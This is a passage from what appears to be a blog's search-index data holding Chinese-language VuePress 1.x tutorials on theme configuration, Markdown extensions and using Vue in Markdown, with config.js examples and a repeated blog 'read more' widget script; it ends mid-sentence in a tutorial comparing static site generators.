'@vuepress/theme-xxx'} 缩写: 1234// .vuepress/config.jsmodule.exports = { theme: '@org/xxx', // 或者一个官方主题: '@vuepress/xxx'} 提示：以 @vuepress/theme- 开头的主题是官方维护的主题 主题的通用配置和插件几乎一样，主题的配置文件 themeEntry 应该导出一个普通的 JavaScript 对象（#1），它也可以是一个返回对象的函数（#2），这个函数接受用户在 siteConfig.themeConfig 为第一个参数、包含编译期上下文的 ctx 对象作为第二个参数。 12345// .vuepress/theme/index.js// #1module.exports = { // ...} 1234567// .vuepress/theme/index.js// #2module.exports = (themeConfig, ctx) =&gt; { return { // ... }} 提示： 你应该能看到 themeEntry 和 themeConfig 的区别，前者是一个主题本身的配置，这些配置由 VuePress 本身提供；而后者则是用户对主题的配置，这些配置选项则由当前使用的主题来实现，如 默认主题配置。 除了本节列出的选项，themeEntry 也支持插件支持的所有 配置选项 和 生命周期。 plugins 类型: Array|Object 默认值: undefined 参考: 插件 &gt; 使用插件 Warning 注意：你一般可能不需要使用下面的这些配置选项，除非你知道你在做什么！ devTemplate 类型: String 默认值: undefined dev 模式下使用的 HTML 模板路径，默认模板见 这里。 ssrTemplate 类型: String 默认值: undefined build 模式下使用的 HTML 模板路径，默认模板见 这里。 参考: Vue SSR Guide &gt; template. extend 类型: String 默认值: undefined 1234// .vuepress/theme/index.jsmodule.exports = { extend: '@vuepress/theme-default'} VuePress 支持一个主题继承于另一个主题。VuePress 将遵循 override 的理念自动帮你解决各种主题属性（如样式、布局组件）的优先级。 参考: 主题继承 例子: @vuepress/theme-vue globalLayout 类型: String 默认值: undefined 1234// .vuepress/theme/index.jsmodule.exports = { globalLayout: '/path/to/your/global/vue/sfc'} 全局布局组件是负责管理全局布局方案的一个组件，VuePress 默认的 globalLayout 会帮你根据 $frontmatter.layout 来渲染不同的布局，所以大部分情况下你不要配置此选项。举例来说，当你想为当前主题设置全局的 header 和 footer 时，你可以这样做： 12345678910111213141516171819202122232425&lt;!-- .vuepress/theme/layouts/GlobalLayout.vue --&gt;&lt;template&gt; &lt;div id=\"global-layout\"&gt; &lt;header&gt;&lt;h1&gt;Header&lt;/h1&gt;&lt;/header&gt; &lt;component :is=\"layout\"/&gt; &lt;footer&gt;&lt;h1&gt;Footer&lt;/h1&gt;&lt;/footer&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default { computed: { layout () { if (this.$page.path) { if (this.$frontmatter.layout) { // 你也可以像默认的 globalLayout 一样首先检测 layout 是否存在 return this.$frontmatter.layout } return 'Layout' } return 'NotFound' } }}&lt;/script&gt; 默认主题的配置下述所列的选项仅对 VuePress 的默认主题生效，如果你在使用一个自定义主题，选项可能会有不同。 首页默认的主题提供了一个首页（Homepage）的布局 (用于 这个网站的主页)。想要使用它，需要在你的根级 README.md 的 YAML Front Matter 指定 home: true。以下是一个如何使用的例子： 12345678910111213141516---home: trueheroImage: /hero.pngheroText: Hero 标题tagline: Hero 副标题actionText: 快速上手 →actionLink: /zh/guide/features:- title: 简洁至上 details: 以 Markdown 为中心的项目结构，以最少的配置帮助你专注于写作。- title: Vue驱动 details: 享受 Vue + webpack 的开发体验，在 Markdown 中使用 Vue 组件，同时可以使用 Vue 来开发自定义主题。- title: 高性能 details: VuePress 为每个页面预渲染生成静态的 HTML，同时在页面被加载的时候，将作为 SPA 运行。footer: MIT Licensed | Copyright © 2018-present Evan You--- 你可以将相应的内容设置为 null 来禁用标题和副标题，任何 YAML Front Matter 之后额外的内容将会以普通的 Markdown 被渲染，并插入到 features 的后面。 导航栏导航栏可能包含你的页面标题、多语言切换、搜索框、 导航栏链接、仓库链接，它们均取决于你的配置。 导航栏 Logo你可以通过 themeConfig.logo 增加导航栏 Logo ，Logo 可以被放置在公共文件目录： 123456// .vuepress/config.jsmodule.exports = { themeConfig: { logo: '/assets/img/logo.png', }} 导航栏链接你可以通过 themeConfig.nav 增加一些导航栏链接: 12345678910// .vuepress/config.jsmodule.exports = { themeConfig: { nav: [ { text: 'Home', link: '/' }, { text: 'Guide', link: '/guide/' }, { text: 'External', link: 'https://google.com' }, ] }} 外部链接 &lt;a&gt; 标签的特性将默认包含 target=\"_blank\" rel=\"noopener noreferrer\"，你可以提供 target 与 rel，它们将被作为特性被增加到 &lt;a&gt; 标签上： 123456789// .vuepress/config.jsmodule.exports = { themeConfig: { nav: [ { text: 'External', link: 'https://google.com', target:'_self', rel:'' }, { text: 'Guide', link: '/guide/', target:'_blank' } ] }} 当你提供了一个 items 数组而不是一个单一的 link 时，它将显示为一个 下拉列表 ： 123456789101112131415// .vuepress/config.jsmodule.exports = { themeConfig: { nav: [ { text: 'Languages', ariaLabel: 'Language Menu', items: [ { text: 'Chinese', link: '/language/chinese/' }, { text: 'Japanese', link: '/language/japanese/' } ] } ] }} 此外，你还可以通过嵌套的 items 来在 下拉列表 中设置分组： 1234567891011121314// .vuepress/config.jsmodule.exports = { themeConfig: { nav: [ { text: 'Languages', items: [ { text: 'Group1', items: [/* */] }, { text: 'Group2', items: [/* */] } ] } ] }} 禁用导航栏你可以使用 themeConfig.navbar 来禁用所有页面的导航栏： 123456// .vuepress/config.jsmodule.exports = { themeConfig: { navbar: false }} 你也可以通过 YAML Front Matter 来禁用某个指定页面的导航栏： 123---navbar: false--- 侧边栏想要使 侧边栏（Sidebar）生效，需要配置 themeConfig.sidebar，基本的配置，需要一个包含了多个链接的数组： 12345678910// .vuepress/config.jsmodule.exports = { themeConfig: { sidebar: [ '/', '/page-a', ['/page-b', 'Explicit link text'] ] }} 你可以省略 .md 拓展名，同时以 / 结尾的路径将会被视为 */README.md，这个链接的文字将会被自动获取到（无论你是声明为页面的第一个 header，还是明确地在 YAML Front Matter 中指定页面的标题）。如果你想要显示地指定链接的文字，使用一个格式为 [link, text] 的数组。 嵌套的标题链接默认情况下，侧边栏会自动地显示由当前页面的标题（headers）组成的链接，并按照页面本身的结构进行嵌套，你可以通过 themeConfig.sidebarDepth 来修改它的行为。默认的深度是 1，它将提取到 h2 的标题，设置成 0 将会禁用标题（headers）链接，同时，最大的深度为 2，它将同时提取 h2 和 h3 标题。 也可以使用 YAML Front Matter 来为某个页面重写此值（优先级最高）： 123---sidebarDepth: 2--- 显示所有页面的标题链接默认情况下，侧边栏只会显示由当前活动页面的标题（headers）组成的链接，你可以将 themeConfig.displayAllHeaders 设置为 true 来显示所有页面的标题链接： 123456// .vuepress/config.jsmodule.exports = { themeConfig: { displayAllHeaders: true // 默认值：false }} 活动的标题链接默认情况下，当用户通过滚动查看页面的不同部分时，嵌套的标题链接和 URL 中的 Hash 值会实时更新，这个行为可以通过以下的配置来禁用： 123456// .vuepress/config.jsmodule.exports = { themeConfig: { activeHeaderLinks: false, // 默认值：true }} 值得一提的是，当你禁用此选项时，此功能的相应脚本将不会被加载，这是我们性能优化的一个小点 侧边栏分组你可以通过使用对象来将侧边栏划分成多个组： 123456789101112131415161718192021// .vuepress/config.jsmodule.exports = { themeConfig: { sidebar: [ { title: 'Group 1', // 必要的 path: '/foo/', // 可选的, 标题的跳转链接，应为绝对路径且必须存在 collapsable: false, // 可选的, 默认值是 true, sidebarDepth: 1, // 可选的, 默认值是 1 children: [ '/' ] }, { title: 'Group 2', children: [ /* ... */ ], initialOpenGroupIndex: -1 // 可选的, 默认值是 0 } ] }} 侧边栏的每个子组默认是可折叠的，你可以设置 collapsable: false 来让一个组永远都是展开状态。一个侧边栏的子组配置同时支持 sidebarDepth 字段用于重写默认显示的侧边栏深度 (1)。 嵌套的侧边栏分组也是支持的 多个侧边栏如果你想为不同的页面组来显示不同的侧边栏，首先，将你的页面文件组织成下述的目录结构： 123456789101112.├─ README.md├─ contact.md├─ about.md├─ foo/│&nbsp;&nbsp;├─ README.md│ ├─ one.md│ └─ two.md└─ bar/ ├─ README.md ├─ three.md └─ four.md 接着，遵循以下的侧边栏配置： 12345678910111213141516171819202122232425// .vuepress/config.jsmodule.exports = { themeConfig: { sidebar: { '/foo/': [ '', /* /foo/ */ 'one', /* /foo/one.html */ 'two' /* /foo/two.html */ ], '/bar/': [ '', /* /bar/ */ 'three', /* /bar/three.html */ 'four' /* /bar/four.html */ ], // fallback '/': [ '', /* / */ 'contact', /* /contact.html */ 'about' /* /about.html */ ] } }} 注意：确保 fallback 侧边栏被最后定义，VuePress 会按顺序遍历侧边栏配置来寻找匹配的配置 自动生成侧栏如果你希望自动生成一个仅仅包含了当前页面标题（headers）链接的侧边栏，你可以通过 YAML Front Matter 来实现（优先级最高）： 123---sidebar: auto--- 你也可以通过配置来在所有页面中启用它： 123456// .vuepress/config.jsmodule.exports = { themeConfig: { sidebar: 'auto' }} 在 多语言 模式下，你也可以将其应用到某一特定的语言下： 12345678// .vuepress/config.jsmodule.exports = { themeConfig: { '/zh/': { sidebar: 'auto' } }} 注意：自动生成的侧边栏，默认支持多级显示（两级以上） 禁用侧边栏你可以通过 YAML Front Matter 来禁用指定页面的侧边栏： 123---sidebar: false--- 搜索框内置搜索你可以通过设置 themeConfig.search: false 来禁用默认的搜索框，或是通过 themeConfig.searchMaxSuggestions 来调整默认搜索框显示的搜索结果数量： 1234567// .vuepress/config.jsmodule.exports = { themeConfig: { search: false, searchMaxSuggestions: 10 }} 你可以通过在页面的 Front Matter 中设置 tags 来优化搜索结果： 123456---tags: - 配置 - 主题 - 索引--- 你可以通过在页面的 Front Matter 中设置 search 来对单独的页面禁用内置的搜索框： 123---search: false--- 提示： 如果你需要全文搜索，你可以使用 Algolia 搜索 内置搜索只会为页面的标题、h2 、 h3 以及 tags 构建搜索索引 Algolia 搜索如果需要全文搜索，你可以通过 themeConfig.algolia 选项来使用 Algolia 搜索 替换内置的搜索框。要启用 Algolia 搜索，你需要至少提供 apiKey 和 indexName： 123456789// .vuepress/config.jsmodule.exports = { themeConfig: { algolia: { apiKey: '&lt;API_KEY&gt;', indexName: '&lt;INDEX_NAME&gt;' } }} 不同于开箱即用的 内置搜索，Algolia 搜索 需要你在使用之前将你的网站提交给它们用于创建索引，更多选项请参考 Algolia DocSearch 的官方文档。 最后更新时间你可以通过 themeConfig.lastUpdated 选项来获取每个文件最后一次 git 提交的 UNIX 时间戳（ms），同时它将以合适的日期格式显示在每一页的底部： 123456// .vuepress/config.jsmodule.exports = { themeConfig: { lastUpdated: 'Last Updated', // string | boolean }} 请注意，themeConfig.lastUpdated 默认是关闭的，如果给定一个字符串，它将会作为前缀显示（默认值是：Last Updated）。由于 lastUpdated 是基于 git 的，所以你只能在一个基于 git 的项目中启用它。此外，由于使用的时间戳来自 git commit，因此它将仅在给定页的第一次提交之后显示，并且仅在该页面后续提交更改时更新。 参考: @vuepress/plugin-last-updated 上 / 下一篇链接上一篇和下一篇文章的链接将会自动地根据当前页面的侧边栏的顺序来获取。 你可以通过 themeConfig.nextLinks 和 themeConfig.prevLinks 来全局禁用它们： 123456789// .vuepress/config.jsmodule.exports = { themeConfig: { // 默认值是 true 。设置为 false 来禁用所有页面的 下一篇 链接 nextLinks: false, // 默认值是 true 。设置为 false 来禁用所有页面的 上一篇 链接 prevLinks: false }} 你也可以使用 YAML Front Matter 来明确地重写或者禁用它们： 1234---prev: ./some-other-pagenext: false--- Git 仓库和编辑链接当你提供了 themeConfig.repo 选项，将会自动在每个页面的导航栏生成生成一个 GitHub 链接，以及在页面的底部生成一个 \"Edit this page\" 链接。 1234567891011121314151617181920212223// .vuepress/config.jsmodule.exports = { themeConfig: { // 假定是 GitHub. 同时也可以是一个完整的 GitLab URL repo: 'vuejs/vuepress', &nbsp; &nbsp;// 自定义仓库链接文字。默认从 `themeConfig.repo` 中自动推断为 &nbsp; &nbsp;// \"GitHub\"/\"GitLab\"/\"Bitbucket\" 其中之一，或是 \"Source\"。 &nbsp; &nbsp;repoLabel: '查看源码', &nbsp; &nbsp;// 以下为可选的编辑链接选项 &nbsp; &nbsp;// 假如你的文档仓库和项目本身不在一个仓库： &nbsp; &nbsp;docsRepo: 'vuejs/vuepress', &nbsp; &nbsp;// 假如文档不是放在仓库的根目录下： &nbsp; &nbsp;docsDir: 'docs', &nbsp; &nbsp;// 假如文档放在一个特定的分支下： &nbsp; &nbsp;docsBranch: 'master', // 默认是 false, 设置为 true 来启用 editLinks: true, // 默认为 \"Edit this page\" editLinkText: '帮助我们改善此页面！' }} 你可以通过 YAML front matter 来禁用指定页面的编辑链接： 123---editLink: false--- 页面滚动你可以通过 themeConfig.smoothScroll 选项来启用页面滚动效果： 123456// .vuepress/config.jsmodule.exports = { themeConfig: { smoothScroll: true }} 自定义页面类（CSS）有时候你可能需要为特定页面添加一个 CSS 类名，以方便针对该页面添加一些专门的 CSS。这种情况下你可以在该页面的 YAML Front Matter 中声明一个 pageClass： 123---pageClass: custom-page-class--- 只能在 .vuepress/styles/index.styl 中编写针对该页面的 CSS ： 12345/* .vuepress/styles/index.styl */.theme-container.custom-page-class { /* 特定页面的 CSS */} 自定义样式应该写在 index.styl 内，该文件可以让你方便地添加或覆盖样式 特定页面的自定义布局默认情况下，每个 *.md 文件将会被渲染在一个 &lt;div class=\"page\"&gt; 容器中，同时还有侧边栏、自动生成的编辑链接，以及上 / 下一篇文章的链接。如果你想要使用一个完全自定义的组件来代替当前的页面（而只保留导航栏），你可以再次使用 YAML Front Matter 来指定这个组件。 123---layout: SpecialLayout--- 这将会为当前的页面渲染 .vuepress/components/SpecialLayout.vue 布局。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"type\": \"hexo\", \"id\": \"readmore-container\", \"name\": \"全栈技术驿站\", \"blogId\": \"96641-5333172926158-056\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"random\": \"0.9\", \"height\": \"auto\", \"expires\": \"365\", \"lockToc\": \"yes\", \"interval\": \"30\", \"baseUrl\": \"\" }); } catch(e) { console.warn(\"readmore plugin occurred error: \" + e.name + \" | \" + e.message); } }",tags:"静态博客"},{title:"VuePress 入门教程之二 Markdown 篇",url:"/posts/b693c9f4.html",text:'前言版本说明本文的内容是基于 VuePress 1.x 讲解的，一切内容以 官方文档 为准。 教程大纲 VuePress 入门教程之一 - 基础篇 VuePress 入门教程之二 - Markdown 篇 VuePress 入门教程之三 - 主题篇 VuePress 入门教程之四 - 插件篇 Markdown 扩展Header Anchors所有的标题将会自动地应用 anchor 链接，anchor 的渲染可以通过 markdown.anchor 来配置。 链接内部链接网站内部的链接，将会被转换成 &lt;router-link&gt; 用于 SPA 导航。同时，站内的每一个文件夹下的 README.md 或者 index.md 文件都会被自动编译为 index.html，对应的链接将被视为 /。 以如下的文件结构为例： 12345678910.├─ README.md├─ foo│&nbsp;&nbsp;├─ README.md│ ├─ one.md│ └─ two.md└─ bar ├─ README.md ├─ three.md └─ four.md 假设你现在位于 foo/one.md 中： 12345[Home](/) &lt;!-- 跳转到根部的 README.md --&gt;[foo](/foo/) &lt;!-- 跳转到 foo 文件夹的 index.html --&gt;[foo heading](./#heading) &lt;!-- 跳转到 foo/index.html 的特定标题位置 --&gt;[bar - three](../bar/three.md) &lt;!-- 具体文件可以使用 .md 结尾（推荐） --&gt;[bar - four](../bar/four.html) &lt;!-- 也可以用 .html --&gt; 链接的重定向VuePress 支持重定向到干净链接。如果一个链接 /foo 找不到，VuePress 会自行寻找一个可用的 /foo/ 或 /foo.html。反过来，当 /foo/ 或 /foo.html 中的一个找不到时，VuePress 也会尝试寻找另一个。借助这种特性，我们可以通过官方插件 vuepress-plugin-clean-urls 定制你的网站路径。 Tip 注意：无论是否使用了 permalink 和 clean-urls 插件，你的相对路径都应该依赖于当前的文件结构来定义。在上面的例子中，即使你将 /foo/one.md 的路径设为了 /foo/one/，你依然应该通过 ./two.md 来访问 /foo/two.md 页面后缀默认情况下，页面和内部链接是以 .html 后缀生成，可以通过设置 config.markdown.pageSuffix 来自定义它。 外部链接外部的链接将会被自动地设置为 target="_blank" rel="noopener noreferrer": 12- [vuejs.org](https://vuejs.org)- [VuePress on GitHub](https://github.com/vuejs/vuepress) 你可以自定义通过配置 config.markdown.externalLinks 来自定义外部链接的特性。 Front MatterVuePress 提供了对 YAML Front Matter 开箱即用的支持: 1234---title: Blogging Like a Hackerlang: en-US--- 这些数据可以在当前 Markdown 的正文，或者是任意的自定义或主题组件中使用。想了解更多，请移步 Front Matter。 Github 风格的表格输入内容 12345| Tables | Are | Cool || ------------- |:-------------:| -----:|| col 3 is | right-aligned | $1600 || col 2 is | centered | $12 || zebra stripes | are neat | $1 | 输出效果 Emoji 表情输入内容 1:tada: :100: 输出效果 你可以在这个列表找到所有可用的 Emoji 表情。 文档目录输入内容 1[[toc]] 输出效果 目录（Table of Contents）的渲染可以通过 markdown.toc 选项来配置。 自定义容器 Warning 注意：自定义容器只针对 VuePress 的默认主题有效。 输入内容 123456789101112131415::: tip这是一个提示:::::: warning这是一个警告:::::: danger这是一个危险警告:::::: details这是一个详情块，在 IE / Edge 中不生效::: 输出效果 代码块中的语法高亮VuePress 使用了 Prism 来为 Markdown 中的代码块实现语法高亮。Prism 支持大量的编程语言，你需要做的只是在代码块的开始倒勾中附加一个有效的语言别名： 输入内容 12345678910``` html&lt;ul&gt; &lt;li v-for="todo in todos" :key="todo.id" &gt; {{ todo.text }} &lt;/li&gt;&lt;/ul&gt;``` 输出效果 在 Prism 的网站上查看 合法的语言列表。 代码块中的行高亮输入内容 123456789``` js {4}export default { data () { return { msg: \'Highlighted!\' } }}``` 输出效果 除了单行以外，你也可指定多行，行数区间，或是两者都指定。 行数区间：例如 {5-8}, {3-10}, {10-17} 多个单行：例如 {4,7,9} 行数区间与多个单行：例如 {4,7-13,16,23-27,40} 输入内容 12345678910111213``` js{1,4,6-7}export default { // Highlighted data () { return { msg: `Highlighted! This line isn\'t highlighted, but this and the next 2 are.`, motd: \'VuePress is awesome\', lorem: \'ipsum\', } }}``` 输出效果 代码块行号显示你可以通过配置来为每个代码块显示行号： 12345module.exports = { markdown: { lineNumbers: true }} 显示效果： 代码块片段导入你可以通过下述的语法，在 Markdown 文件中导入已经存在的其他文件中的代码段： 1&lt;&lt;&lt; @/filepath 它也支持 行高亮，语法如下： 1&lt;&lt;&lt; @/filepath{highlightLines} 输入内容 1&lt;&lt;&lt; @/../@vuepress/markdown/__tests__/fragments/snippet.js{2} 输出效果 Tip 注意：由于代码段的导入将在 Webpack 编译之前执行，因此你无法使用 Webpack 中的路径别名，此处的 @ 默认值是 process.cwd() 为了只导入对应部分的代码，你也可运用 VS Code Region。你可以在文件路径后方的 # 紧接着提供一个自定义的区域名称（预设为 snippet ） 代码文件 1234567891011121314151617181920212223242526272829303132// #region snippetfunction foo () { return ({ dest: \'../../vuepress\', locales: { \'/\': { lang: \'en-US\', title: \'VuePress\', description: \'Vue-powered Static Site Generator\' }, \'/zh/\': { lang: \'zh-CN\', title: \'VuePress\', description: \'Vue 驱动的静态网站生成器\' } }, head: [ [\'link\', { rel: \'icon\', href: `/logo.png` }], [\'link\', { rel: \'manifest\', href: \'/manifest.json\' }], [\'meta\', { name: \'theme-color\', content: \'#3eaf7c\' }], [\'meta\', { name: \'apple-mobile-web-app-capable\', content: \'yes\' }], [\'meta\', { name: \'apple-mobile-web-app-status-bar-style\', content: \'black\' }], [\'link\', { rel: \'apple-touch-icon\', href: `/icons/apple-touch-icon-152x152.png` }], [\'link\', { rel: \'mask-icon\', href: \'/icons/safari-pinned-tab.svg\', color: \'#3eaf7c\' }], [\'meta\', { name: \'msapplication-TileImage\', content: \'/icons/msapplication-icon-144x144.png\' }], [\'meta\', { name: \'msapplication-TileColor\', content: \'#000000\' }] ] })}// #endregion snippetexport default foo 输入内容 1&lt;&lt;&lt; @/../@vuepress/markdown/__tests__/fragments/snippet-with-region.js#snippet{1} 输出效果 进阶配置VuePress 使用 markdown-it 来渲染 Markdown，上述大多数的拓展也都是通过自定义的插件实现的。想要进一步的话，你可以通过 .vuepress/config.js 的 markdown 选项，来对当前的 markdown-it 实例做一些自定义的配置： 123456789101112module.exports = { markdown: { // markdown-it-anchor 的选项 anchor: { permalink: false }, // markdown-it-toc 的选项 toc: { includeLevel: [1, 2] }, extendMarkdown: md =&gt; { &nbsp; &nbsp; &nbsp;// 使用更多的 markdown-it 插件! md.use(require(\'markdown-it-xxx\')) } }} 在 Markdown 中 使用 Vue浏览器的 API 访问限制当你在开发一个 VuePress 应用时，由于所有的页面在生成静态 HTML 时都需要通过 Node.js 服务端渲染，因此所有的 Vue 相关代码都应当遵循 编写通用代码 的要求。简而言之，请确保只在 beforeMount 或者 mounted 访问浏览器 DOM 的 API。 如果你正在使用，或者需要展示一个对于 SSR 不怎么友好的组件（比如包含了自定义指令），你可以将它们包裹在内置的 &lt;ClientOnly&gt; 组件中： 123&lt;ClientOnly&gt; &lt;NonSSRFriendlyComponent/&gt;&lt;/ClientOnly&gt; 请注意，这并不能解决一些组件或库在导入时就试图访问浏览器 API 的问题 —— 如果需要使用这样的组件或库，你需要在合适的生命周期钩子中动态导入它们： 123456789&lt;script&gt;export default { mounted () { import(\'./lib-that-access-window-on-import\').then(module =&gt; { // use code }) }}&lt;/script&gt; 如果你的模块通过 export default 导出一个 Vue 组件，那么你可以动态注册它： 1234567891011121314151617&lt;template&gt; &lt;component v-if="dynamicComponent" :is="dynamicComponent"&gt;&lt;/component&gt;&lt;/template&gt;&lt;script&gt;export default { data() { return { dynamicComponent: null } }, mounted () { import(\'./lib-that-access-window-on-import\').then(module =&gt; { this.dynamicComponent = module.default }) }}&lt;/script&gt; 参考： Vue.js &gt; 动态组件 模板语法插值每一个 Markdown 文件将首先被编译成 HTML，接着作为一个 Vue 组件传入 vue-loader，这意味着你可以在文本中使用 Vue 风格的插值： 输入内容 1{{ 1 + 1 }} 输出效果 12 指令同样地，也可以使用指令: 输入内容 1&lt;span v-for="i in 3"&gt;{{ i }} &lt;/span&gt; 输出效果 11 2 3 访问网站以及页面的数据编译后的组件没有私有数据，但可以访问 网站的元数据，举例来说： 输入内容 1{{ $page }} 输出效果 12345{ "path": "/using-vue.html", "title": "Using Vue in Markdown", "frontmatter": {}} Escaping默认情况下，块级 (block) 的代码块将会被自动包裹在 v-pre 中。如果你想要在内联 (inline) 的代码块或者普通文本中显示原始的大括号，或者一些 Vue 特定的语法，你需要使用自定义容器 v-pre 来包裹： 输入内容 123::: v-pre`{{ This will be displayed as-is }}`::: 输出效果 1{{ This will be displayed as-is }} 使用组件正常使用组件所有在 .vuepress/components 中找到的 *.vue 文件将会自动地被注册为全局的异步组件，如： 1234567.└─ .vuepress &nbsp;&nbsp;└─ components ├─ demo-1.vue &nbsp;&nbsp; &nbsp;├─ OtherComponent.vue &nbsp; &nbsp; &nbsp;└─ Foo &nbsp; &nbsp; &nbsp; &nbsp; └─ Bar.vue 你可以直接使用这些组件在任意的 Markdown 文件中（组件名是通过文件名取到的）： 123&lt;demo-1/&gt;&lt;OtherComponent/&gt;&lt;Foo-Bar/&gt; Warning 重要：请确保一个自定义组件的名字包含连接符或者是 PascalCase，否则，它将会被视为一个内联元素，并被包裹在一个 &lt;p&gt; 标签中，这将会导致 HTML 渲染紊乱，因为 HTML 标准规定， &lt;p&gt; 标签中不允许放置任何块级元素。 在标题中使用组件你可以在标题中使用 Vue 组件，但是请留意以下两种方式的不同： Markdown 输出的 HTML 解析后的标题 # text &lt;Tag/&gt; &lt;h1&gt;text &lt;Tag/&gt;&lt;/h1&gt; text # text `&lt;Tag/&gt;` &lt;h1&gt;text &lt;code&gt;&amp;lt;Tag/&amp;gt;&lt;/code&gt;&lt;/h1&gt; text &lt;Tag/&gt; 被 &lt;code&gt; 包装的 HTML 将按原样显示，只有未被包装的 HTML 才会被 Vue 解析。输出的 HTML 由 markdown-it 完成，而解析后的标题由 VuePress 完成，用于侧边栏以及文档的标题。 使用预处理器VuePress 对以下预处理器已经内置相关的 Webpack 配置：sass、scss、less、stylus 和 pug。要使用它们你只需要在项目中安装对应的依赖即可。例如，要使用 sass，需要安装： 1$ yarn add -D sass-loader node-sass 然后你就可以在 Markdown 或是组件中使用如下代码： 1234&lt;style lang="sass"&gt; .title font-size: 20px&lt;/style&gt; 要在组件中使用 &lt;template lang="pug"&gt;，则需要安装 pug 和 pug-plain-loader: 1$ yarn add -D pug pug-plain-loader 需要指出的是，如果你是一个 stylus 用户，你并不需要在你的项目中安装 stylus 和 stylus-loader，因为 VuePress 已经内置了它们。对于那些没有内置的预处理器，除了安装对应的依赖，你还需要 拓展内部的 Webpack 配置。 脚本和样式提升有时，你可以只想在当前页面应用一些 JavaScript 或者 CSS，在这种情况下，你可以直接在 Markdown 文件中使用原生的 &lt;script&gt; 或者 &lt;style&gt; 标签，它们将会从编译后的 HTML 文件中提取出来，并作为生成的 Vue 单文件组件的 &lt;script&gt; 和 &lt;style&gt; 标签。 输入内容 1234567891011121314151617&lt;p class="demo" :class="$style.example"&gt;&lt;/p&gt;&lt;style module&gt;.example { color: #41b883;}&lt;/style&gt;&lt;script&gt;export default { props: [\'slot-key\'], mounted () { document.querySelector(`.${this.$style.example}`) .textContent = \'这个块是被内联的脚本渲染的，样式也采用了内联样式。\' }}&lt;/script&gt; 输出效果 内置的组件OutboundLinkOutboundLink 用来表明当前是一个外部链接，在 VuePress 中这个组件会紧跟在每一个外部链接后面。 ClientOnly参考 浏览器的 API 访问限制。 Content Props: pageKey - string, 要渲染的 page 的 hash key, 默认值是当前页面的 key. slotKey - string, 页面的 markdown slot 的 key. 默认值是 default slot. Usage： 指定一个指定页面的特定 slot 用于渲染，当你使用 自定义布局 或者自定义主题时，这将非常有用。 1&lt;Content/&gt; 参考: 全局计算属性 &gt; $page Markdown 插槽 开发主题 &gt; 获取渲染内容 Badge 注意： Badge 只针对 VuePress 的默认主题生效 Props: text - string type - string, 可选值： "tip"|"warning"|"error"，默认值是： "tip" vertical - string, 可选值： "top"|"middle"，默认值是： "top" Usage: 你可以在标题中，使用这个组件来为某些 API 添加一些状态。 输入内容 1### Badge &lt;Badge text="beta" type="warning"/&gt; &lt;Badge text="默认主题"/&gt; 输入效果 参考: 在标题中使用组件 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"静态博客"},{title:"VuePress 入门教程之一基础篇",url:"/posts/8d13e75d.html",text:'前言版本说明本文的内容是基于 VuePress 1.x 讲解的，一切内容以 官方文档 为准。 教程大纲 VuePress 入门教程之一 - 基础篇 VuePress 入门教程之二 - Markdown 篇 VuePress 入门教程之三 - 主题篇 VuePress 入门教程之四 - 插件篇 静态网站生成器比较Hexo Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其它渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。Hexo 配合它的主题模块，比如 NexT 主题，可以作为非常简洁方便的静态博客系统。 GitBook GitBook 是一个现代的文档平台，团队或个人可以在其上编写产品、API 接口文档以及团队内部知识库。GitBook 改版之后，感觉团队更专注于商业产品而不是开源工具，同时 CLI 工具不再提供了，所以无法实现个性化部署。 Nuxt Nuxt.js 是一个基于 Vue.js 的通用应用框架。通过对客户端 / 服务端基础架构的抽象组织，Nuxt.js 主要关注的是应用的 UI 渲染。Nuxt.js 的目标是创建一个灵活的应用框架，你可以基于它初始化新项目的基础结构代码，或者在已有 Node.js 项目中使用 Nuxt.js。简而言之，Nuxt.js 更像是为构建应用程序而生的，而不是独立的内容静态网站。 Docsify Docsify 是一个动态生成文档网站的工具。不同于 GitBook、Hexo 的地方是它不会生成将 .md 转成 .html 文件，所有转换工作都是在运行时进。Docsify 是基于 Vue，完全的运行时驱动，不需要渲染 HTML，所以对 SEO 不够友好。如果不关注 SEO，安装简单化不想有大量依赖，它是比较好的选择，比如公司或这团队内部的文档系统。 Docute Docute 本质上就是一个 JavaScript 文件，它可以获取 Markdown 文件并将它们呈现为单页面应用。它完全由运行时驱动，因此并不涉及服务端组件，这就意味着没有构建过程。你只需创建一个 HTML 文件和一堆 Markdown 文档，你的网站就差不多完成了！Docute 与 Docsify 基本一样，只是在文件大小和 UI 及不同的使用方式，Docute 官网有其差异的介绍。 VuePress VuePress 实际上是由 Vue、Vue Router 和 Webpack 驱动的单页面应用程序，实现了 GitBook 的功能。VuePress 展示页面与 Docsify 类似，但是与 Docsify 不同的是会预先渲染 HTML。每个 Markdown 文件都使用 markdown-it 编译为 HTML，然后作为 Vue 组件的模板进行处理；这允许你直接在 Markdown 文件中使用 Vue，在需要嵌入动态内容时，这种使用方式非常有用。 Other Jekyll、Typecho、Hugo、Ghost VuePress 介绍VuePress 由两部分组成：第一部分是一个极简静态网站生成器，它包含由 Vue 驱动的主题系统和插件 API，另一个部分是为书写技术文档而优化的默认主题，它的诞生初衷是为了支持 Vue 及其子项目的文档需求。每一个由 VuePress 生成的页面都带有预渲染好的 HTML，也因此具有非常好的加载性能和搜索引擎优化（SEO）。同时，一旦页面被加载，Vue 将接管这些静态内容，并将其转换成一个完整的单页应用（SPA），其他的页面则会只在用户浏览到的时候才按需加载。 工作原理事实上，一个 VuePress 网站是一个由 